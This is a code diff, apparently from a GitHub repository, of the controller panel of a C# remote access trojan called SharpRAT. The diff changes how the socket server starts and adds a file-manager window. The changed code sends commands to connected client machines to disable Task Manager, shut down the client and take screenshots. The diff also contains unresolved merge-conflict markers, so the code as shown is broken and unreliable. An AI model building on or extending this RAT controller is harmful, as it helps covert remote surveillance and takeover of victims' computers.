@@ -4,11 +4,10 @@ namespace Server
 {
     public partial class Main : Form
     {
+        private string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SharpRAT";
         private readonly ImageList imageList;
-        public readonly SocketServer socketServer;
-        #pragma warning disable CS8618
-            public static RequestUI uiRequests;
-#pragma warning restore CS8618
+        public static SocketServer socketServer;
+        public static RequestUI uiRequests;
 
         public Main()
         {
@@ -16,8 +15,8 @@ namespace Server
             uiRequests = new RequestUI();
             imageList = new ImageList();
             InitializeComponent();
-
         }
+
         private void AddUserToViewlist(string text)
         {
             // Parse text
@@ -28,7 +27,7 @@ namespace Server
 
             // Add data to viewList.
             Bitmap image;
-            image = WinIcons.GetImageFromIcon("dsuiext.dll", (int)WinIcons.Dsuiext.User_ICO);
+            image = WinIcons.GetImageFromIcon("dsuiext.dll", (int)WinIcons.Dsuiext.User);
             imageList.Images.Add(image);
             imageList.ColorDepth = ColorDepth.Depth32Bit; // Improves quality of the image.
             userView.SmallImageList = imageList;
@@ -69,26 +68,28 @@ namespace Server
              Load icons from Windows internal dlls with quite bad quality,
              it would be smarter to extract the icon files to TEMP and load them from there for better quality.
             */
-            settingsToolStripMenuItem.Image = WinIcons.GetImageFromIcon("wmploc.dll", (int)WinIcons.Wmploc.Settings_ICO);
-            sendMessageBoxToolStripMenuItem.Image = WinIcons.GetImageFromIcon("shell32.dll", (int)WinIcons.ShellID.PcKeyboard_ICO);
-            userControlToolStripMenuItem.Image = WinIcons.GetImageFromIcon("shell32.dll", (int)WinIcons.ShellID.Keychain_ICO);
-            disableTaskmanagerToolStripMenuItem.Image = WinIcons.GetImageFromIcon("shell32.dll", (int)WinIcons.ShellID.NotAllowed_ICO);
-            shutdownClientToolStripMenuItem.Image = WinIcons.GetImageFromIcon("shell32.dll", (int)WinIcons.ShellID.Shutdown_ICO);
+            settingsToolStripMenuItem.Image = WinIcons.GetImageFromIcon("shell32.dll", (int)WinIcons.ShellID.Settings, false);
+            sendMessageBoxToolStripMenuItem.Image = WinIcons.GetImageFromIcon("shell32.dll", (int)WinIcons.ShellID.PcKeyboard);
+            fileManagerToolStripMenuItem.Image = WinIcons.GetImageFromIcon("shell32.dll", (int)WinIcons.ShellID.FilledFolder, false);
+            userControlToolStripMenuItem.Image = WinIcons.GetImageFromIcon("shell32.dll", (int)WinIcons.ShellID.Keychain, false);
+            disableTaskmanagerToolStripMenuItem.Image = WinIcons.GetImageFromIcon("shell32.dll", (int)WinIcons.ShellID.NotAllowed);
+            shutdownClientToolStripMenuItem.Image = WinIcons.GetImageFromIcon("shell32.dll", (int)WinIcons.ShellID.Shutdown, false);
         }
 
         private void Main_Load(object sender, EventArgs e)
         {
-            if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SharpRAT"))
-            {
-                Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SharpRAT\\");
-            }
+            // Create directory if it does not exist.
+            if (!File.Exists(folderPath))
+                Directory.CreateDirectory(folderPath);
+
+            // Load config values if the config exists.
+            if (File.Exists(User.Config.GetConfigPath()))
+                User.Config.Read();
+
             LoadImagesForUI();
 
-            // Start the server on it's own thread, so it does not hog all the UI resources.
-            Thread serverThread = new Thread(socketServer.ExecuteServer);
-            serverThread.IsBackground = true;
-            serverThread.Start();
-            UpdateStatus("Server started");
+            if(User.Config.bRunServer)
+                socketServer.StartServer();
         }
 
         private void uiUpdateTimer_Tick(object sender, EventArgs e)
@@ -129,24 +130,31 @@ namespace Server
         private void disableTaskmanagerToolStripMenuItem_CheckedChanged(object sender, EventArgs e)
         {
             string messageBoxStr
-                = "<SET-TASKMGR>" + Convert.ToInt32(disableTaskmanagerToolStripMenuItem.Checked).ToString() + "<EOF>";
+                = "<SET-TASKMGR>" + Convert.ToInt32(disableTaskmanagerToolStripMenuItem.Checked).ToString();
             socketServer.Send(SocketServer.GetClient(userView.SelectedItems[0].Index).socket, messageBoxStr);
         }
 
         private void shutdownClientToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            socketServer.Send(SocketServer.GetClient(userView.SelectedItems[0].Index).socket, "<SHUTDOWN-CLIENT>" + "<EOF>");
+            socketServer.Send(SocketServer.GetClient(userView.SelectedItems[0].Index).socket, "<SHUTDOWN-CLIENT>");
         }
 
         private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            UI.Settings settings = new UI.Settings();
+            UI.Settings settings = new();
             settings.ShowDialog();
         }
 
+<<<<<<< HEAD
         private void ScreenshotMenuItem_Click(object sender, EventArgs e)
         {
             socketServer.Send(SocketServer.GetClient(userView.SelectedItems[0].Index).socket, "<SCREENSHOT>" + "<EOF>");
+=======
+        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            UI.FileManager fileManager = new(userView.SelectedItems[0].Index);
+            fileManager.ShowDialog();
+>>>>>>> main
         }
     }
 }
